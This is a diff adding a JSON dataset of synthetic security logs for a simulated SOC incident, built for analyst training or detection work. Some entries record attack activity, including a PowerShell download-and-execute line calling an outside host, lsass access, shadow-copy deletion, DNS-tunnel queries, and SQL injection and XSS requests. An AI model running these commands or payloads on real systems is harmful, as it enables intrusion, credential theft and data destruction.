@@ -1,0 +1,78 @@
+{
+  "schemaVersion": 1,
+  "provenance": "simulated",
+  "description": "Synthetic raw log lines in seven common formats, written to match the simulated SOC events and incidents. Internal hosts use RFC 1918 addresses, external addresses use RFC 5737 documentation ranges, and domains use reserved TLDs. Formats are representative of each source but are not byte-exact exports from any specific product version.",
+  "generated": "2026-11-22",
+  "syslogYear": 2026,
+  "assets": [
+    { "ip": "10.20.0.10", "host": "DC-01", "role": "Domain controller", "criticality": "critical" },
+    { "ip": "10.20.0.53", "host": "dns-01", "role": "Internal DNS resolver", "criticality": "high" },
+    { "ip": "10.20.3.14", "host": "WS-FIN-014", "role": "Finance workstation", "criticality": "medium" },
+    { "ip": "10.20.4.22", "host": "WS-HR-022", "role": "HR workstation", "criticality": "medium" },
+    { "ip": "10.20.5.14", "host": "FS-02", "role": "File server", "criticality": "critical" },
+    { "ip": "10.20.8.31", "host": "WS-ENG-031", "role": "Engineering workstation", "criticality": "medium" },
+    { "ip": "10.30.0.5", "host": "web-01", "role": "DMZ web server", "criticality": "high" },
+    { "ip": "10.30.0.9", "host": "bastion-01", "role": "SSH bastion", "criticality": "high" }
+  ],
+  "logs": [
+    { "id": "LOG-001", "type": "windows", "raw": "2026-11-21T22:01:14Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50122 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-002", "type": "windows", "raw": "2026-11-21T22:01:19Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50131 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-003", "type": "windows", "raw": "2026-11-21T22:01:27Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50140 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-004", "type": "windows", "raw": "2026-11-21T22:01:35Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50152 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-005", "type": "windows", "raw": "2026-11-21T22:01:44Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50167 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-006", "type": "windows", "raw": "2026-11-21T22:01:52Z WS-FIN-014 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=j.doe TargetDomainName=CORP IpAddress=203.0.113.45 IpPort=50171 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+
+    { "id": "LOG-007", "type": "windows", "raw": "2026-11-21T22:30:41Z DC-01 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=adm.svc TargetDomainName=CORP IpAddress=192.0.2.77 IpPort=61001 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-008", "type": "windows", "raw": "2026-11-21T22:30:50Z DC-01 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=adm.svc TargetDomainName=CORP IpAddress=192.0.2.77 IpPort=61009 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-009", "type": "windows", "raw": "2026-11-21T22:30:58Z DC-01 Microsoft-Windows-Security-Auditing EventID=4625 LogonType=3 TargetUserName=adm.svc TargetDomainName=CORP IpAddress=192.0.2.77 IpPort=61015 Status=0xC000006D SubStatus=0xC000006A FailureReason=\"Unknown user name or bad password.\"" },
+    { "id": "LOG-010", "type": "windows", "raw": "2026-11-21T22:31:09Z DC-01 Microsoft-Windows-Security-Auditing EventID=4624 LogonType=10 TargetUserName=adm.svc TargetDomainName=CORP IpAddress=192.0.2.77 IpPort=61022 LogonProcessName=User32 AuthenticationPackageName=Negotiate" },
+    { "id": "LOG-011", "type": "windows", "raw": "2026-11-21T22:31:10Z DC-01 Microsoft-Windows-Security-Auditing EventID=4672 SubjectUserName=adm.svc SubjectDomainName=CORP PrivilegeList=\"SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege\"" },
+
+    { "id": "LOG-012", "type": "sysmon", "raw": "2026-11-21T22:36:49Z WS-HR-022 Microsoft-Windows-Sysmon EventID=1 Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" CommandLine=\"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...(truncated)\" ParentImage=\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" User=CORP\\m.ito" },
+    { "id": "LOG-013", "type": "powershell", "raw": "2026-11-21T22:36:52Z WS-HR-022 Microsoft-Windows-PowerShell EventID=4104 ScriptBlockId=6f1c2a0e-3b7d-4c55-9a7e-0d2f8b1e4c10 ScriptBlockText=\"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')\"" },
+    { "id": "LOG-014", "type": "sysmon", "raw": "2026-11-21T22:36:53Z WS-HR-022 Microsoft-Windows-Sysmon EventID=3 Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Protocol=tcp Initiated=true SourceIp=10.20.4.22 SourcePort=52011 DestinationIp=198.51.100.88 DestinationPort=80 User=CORP\\m.ito" },
+    { "id": "LOG-015", "type": "sysmon", "raw": "2026-11-21T22:37:05Z WS-HR-022 Microsoft-Windows-Sysmon EventID=3 Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Protocol=tcp Initiated=true SourceIp=10.20.4.22 SourcePort=52019 DestinationIp=198.51.100.88 DestinationPort=443 User=CORP\\m.ito" },
+    { "id": "LOG-016", "type": "sysmon", "raw": "2026-11-21T22:37:20Z WS-HR-022 Microsoft-Windows-Sysmon EventID=11 Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" TargetFilename=\"C:\\Users\\m.ito\\AppData\\Roaming\\updchk.exe\" User=CORP\\m.ito" },
+    { "id": "LOG-017", "type": "sysmon", "raw": "2026-11-21T22:44:30Z WS-HR-022 Microsoft-Windows-Sysmon EventID=10 SourceImage=\"C:\\Users\\m.ito\\AppData\\Roaming\\updchk.exe\" TargetImage=\"C:\\Windows\\System32\\lsass.exe\" GrantedAccess=0x1010 SourceUser=\"NT AUTHORITY\\SYSTEM\"" },
+    { "id": "LOG-018", "type": "windows", "raw": "2026-11-21T22:58:12Z FS-02 Microsoft-Windows-Security-Auditing EventID=4624 LogonType=10 TargetUserName=m.ito TargetDomainName=CORP IpAddress=10.20.4.22 IpPort=49822 LogonProcessName=User32 AuthenticationPackageName=Negotiate" },
+
+    { "id": "LOG-019", "type": "sysmon", "raw": "2026-11-21T23:05:41Z WS-ENG-031 Microsoft-Windows-Sysmon EventID=22 Image=\"C:\\Users\\a.khan\\AppData\\Local\\Temp\\odsync.exe\" QueryName=mzxw6ytboi2dsnrrgezdgnbvgy3tqojq.cdn-sync.example QueryStatus=0 User=CORP\\a.khan" },
+    { "id": "LOG-020", "type": "dns", "raw": "21-Nov-2026 23:05:41.112 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53122 (mzxw6ytboi2dsnrrgezdgnbvgy3tqojq.cdn-sync.example): query: mzxw6ytboi2dsnrrgezdgnbvgy3tqojq.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-021", "type": "dns", "raw": "21-Nov-2026 23:05:43.508 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53140 (nbswy3dpeb3w64tmmqqgc3tdmuqgs3tl.cdn-sync.example): query: nbswy3dpeb3w64tmmqqgc3tdmuqgs3tl.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-022", "type": "dns", "raw": "21-Nov-2026 23:05:45.927 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53161 (kru6v4zameqhgzlomrzs4ljaorwxazlb.cdn-sync.example): query: kru6v4zameqhgzlomrzs4ljaorwxazlb.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-023", "type": "dns", "raw": "21-Nov-2026 23:05:48.311 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53177 (gezdgnbvgy3tqojqgezdgnbvgy3tqojq.cdn-sync.example): query: gezdgnbvgy3tqojqgezdgnbvgy3tqojq.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-024", "type": "dns", "raw": "21-Nov-2026 23:05:50.746 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53190 (onswg4tforrw63ljnzxwk4zamfzxg2lo.cdn-sync.example): query: onswg4tforrw63ljnzxwk4zamfzxg2lo.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-025", "type": "dns", "raw": "21-Nov-2026 23:05:53.004 queries: info: client @0x7f3a2c0d8e10 10.20.8.31#53204 (mfrggzdfmztwq2lknnwg23tpobyxe43u.cdn-sync.example): query: mfrggzdfmztwq2lknnwg23tpobyxe43u.cdn-sync.example IN TXT + (10.20.0.53)" },
+    { "id": "LOG-026", "type": "dns", "raw": "21-Nov-2026 23:06:10.220 queries: info: client @0x7f3a2c0d8e10 10.20.3.14#51002 (intranet.corp.example): query: intranet.corp.example IN A + (10.20.0.53)" },
+    { "id": "LOG-027", "type": "dns", "raw": "21-Nov-2026 23:06:14.871 queries: info: client @0x7f3a2c0d8e10 10.20.4.22#51077 (www.example.com): query: www.example.com IN A + (10.20.0.53)" },
+
+    { "id": "LOG-028", "type": "firewall", "raw": "2026-11-21T23:12:18Z edge-fw-01 action=deny proto=tcp src=203.0.113.9 spt=40211 dst=10.30.0.5 dpt=22 rule=IN-DEFAULT-DENY" },
+    { "id": "LOG-029", "type": "firewall", "raw": "2026-11-21T23:12:18Z edge-fw-01 action=deny proto=tcp src=203.0.113.9 spt=40212 dst=10.30.0.5 dpt=23 rule=IN-DEFAULT-DENY" },
+    { "id": "LOG-030", "type": "firewall", "raw": "2026-11-21T23:12:19Z edge-fw-01 action=deny proto=tcp src=203.0.113.9 spt=40213 dst=10.30.0.5 dpt=445 rule=IN-DEFAULT-DENY" },
+    { "id": "LOG-031", "type": "firewall", "raw": "2026-11-21T23:12:19Z edge-fw-01 action=deny proto=tcp src=203.0.113.9 spt=40214 dst=10.30.0.5 dpt=3389 rule=IN-DEFAULT-DENY" },
+
+    { "id": "LOG-032", "type": "web", "raw": "198.51.100.14 - - [21/Nov/2026:23:20:31 +0000] \"GET /products.php?id=1%27 HTTP/1.1\" 500 1187 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"" },
+    { "id": "LOG-033", "type": "web", "raw": "198.51.100.14 - - [21/Nov/2026:23:20:44 +0000] \"GET /products.php?id=1%20AND%20SLEEP(5) HTTP/1.1\" 200 5310 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"" },
+    { "id": "LOG-034", "type": "web", "raw": "198.51.100.14 - - [21/Nov/2026:23:20:55 +0000] \"GET /products.php?id=1%27%20OR%201%3D1-- HTTP/1.1\" 500 1289 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"" },
+    { "id": "LOG-035", "type": "web", "raw": "203.0.113.80 - - [21/Nov/2026:23:21:02 +0000] \"GET /index.html HTTP/1.1\" 200 8421 \"https://www.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36\"" },
+    { "id": "LOG-036", "type": "web", "raw": "198.51.100.14 - - [21/Nov/2026:23:21:30 +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\" 403 512 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"" },
+
+    { "id": "LOG-037", "type": "windows", "raw": "2026-11-21T23:47:26Z WS-HR-022 Microsoft-Windows-Security-Auditing EventID=4698 SubjectUserName=m.ito SubjectDomainName=CORP TaskName=\"\\Microsoft\\Windows\\UpdateCheck\"" },
+    { "id": "LOG-038", "type": "sysmon", "raw": "2026-11-21T23:52:40Z WS-ENG-031 Microsoft-Windows-Sysmon EventID=13 EventType=SetValue Image=\"C:\\Users\\a.khan\\AppData\\Local\\Temp\\odsync.exe\" TargetObject=\"HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync\" Details=\"C:\\Users\\a.khan\\AppData\\Local\\Temp\\odsync.exe\" User=CORP\\a.khan" },
+    { "id": "LOG-039", "type": "sysmon", "raw": "2026-11-22T00:03:11Z FS-02 Microsoft-Windows-Sysmon EventID=1 Image=\"C:\\Windows\\System32\\vssadmin.exe\" CommandLine=\"vssadmin.exe delete shadows /all /quiet\" ParentImage=\"C:\\Users\\Public\\svc.exe\" User=CORP\\m.ito" },
+    { "id": "LOG-040", "type": "edr", "raw": "{\"ts\":\"2026-11-22T00:03:58Z\",\"host\":\"FS-02\",\"vendor\":\"demo-edr\",\"detection\":\"Ransomware behaviour: mass file rename\",\"process\":\"C:\\\\Users\\\\Public\\\\svc.exe\",\"files_affected\":3412,\"extension\":\".lockd\",\"action\":\"isolation_requested\",\"isolation_status\":\"pending_agent_ack\",\"severity\":\"critical\"}" },
+    { "id": "LOG-041", "type": "windows", "raw": "2026-11-22T00:10:22Z DC-01 Microsoft-Windows-Eventlog EventID=1102 SubjectUserName=adm.svc SubjectDomainName=CORP" },
+    { "id": "LOG-042", "type": "windows", "raw": "2026-11-22T00:18:45Z DC-01 Microsoft-Windows-Security-Auditing EventID=4720 SubjectUserName=adm.svc SubjectDomainName=CORP TargetUserName=svc_backup2 TargetDomainName=CORP" },
+    { "id": "LOG-043", "type": "firewall", "raw": "2026-11-22T00:26:33Z edge-fw-01 action=allow proto=tcp src=10.20.5.14 spt=51522 dst=203.0.113.200 dpt=8443 bytes_out=2469606195 bytes_in=1840213 duration=712 rule=OUT-WEB-ALT" },
+    { "id": "LOG-044", "type": "edr", "raw": "{\"ts\":\"2026-11-22T00:31:40Z\",\"host\":\"FS-02\",\"vendor\":\"demo-edr\",\"detection\":\"Network containment confirmed\",\"process\":\"-\",\"action\":\"host_isolated\",\"isolation_status\":\"enforced\",\"severity\":\"info\"}" },
+
+    { "id": "LOG-045", "type": "linux-auth", "raw": "Nov 22 00:41:05 bastion-01 sshd[3112]: Failed password for root from 203.0.113.61 port 52114 ssh2" },
+    { "id": "LOG-046", "type": "linux-auth", "raw": "Nov 22 00:41:09 bastion-01 sshd[3112]: Failed password for root from 203.0.113.61 port 52114 ssh2" },
+    { "id": "LOG-047", "type": "linux-auth", "raw": "Nov 22 00:41:14 bastion-01 sshd[3118]: Invalid user admin from 203.0.113.61 port 52130" },
+    { "id": "LOG-048", "type": "linux-auth", "raw": "Nov 22 00:41:15 bastion-01 sshd[3118]: Failed password for invalid user admin from 203.0.113.61 port 52130 ssh2" },
+    { "id": "LOG-049", "type": "linux-auth", "raw": "Nov 22 00:55:17 bastion-01 sshd[3170]: Accepted publickey for deploy from 192.0.2.10 port 40122 ssh2: ED25519 SHA256:(fingerprint redacted)" },
+    { "id": "LOG-050", "type": "sysmon", "raw": "2026-11-22T01:15:02Z WS-ENG-031 Microsoft-Windows-Sysmon EventID=1 Image=\"C:\\Windows\\System32\\rundll32.exe\" CommandLine=rundll32.exe ParentImage=\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" User=CORP\\a.khan" },
+    { "id": "LOG-051", "type": "firewall", "raw": "2026-11-22T01:30:58Z edge-fw-01 action=allow proto=tcp src=10.20.4.22 spt=53344 dst=198.51.100.88 dpt=443 bytes_out=1840 bytes_in=912 duration=1 rule=OUT-WEB" },
+    { "id": "LOG-052", "type": "windows", "raw": "2026-11-22T01:44:12Z DC-01 Microsoft-Windows-Security-Auditing EventID=4740 TargetUserName=j.doe TargetDomainName=CORP CallerComputerName=WS-FIN-014" }
+  ]
+}
